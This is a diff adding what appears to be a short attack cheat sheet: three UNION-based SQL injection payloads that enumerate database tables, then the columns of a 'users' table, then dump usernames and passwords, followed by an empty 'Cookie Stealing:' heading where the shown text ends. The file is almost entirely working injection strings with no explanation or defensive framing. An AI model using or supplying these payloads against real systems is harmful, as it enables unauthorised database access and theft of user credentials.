@@ -1,0 +1,10 @@
+SQL INJECTION
+
+wontmatchever%' UNION (SELECT 1, table_name, table_schema, null, null FROM information_schema.tables WHERE table_schema='public'); --%
+
+wontmatchever%' UNION (SELECT 1, column_name, table_name, null, null FROM information_schema.columns WHERE table_name='users'); --%
+
+
+wontmatchever%' UNION (SELECT id, username, password, null, null FROM users); --%
+
+Cookie Stealing:
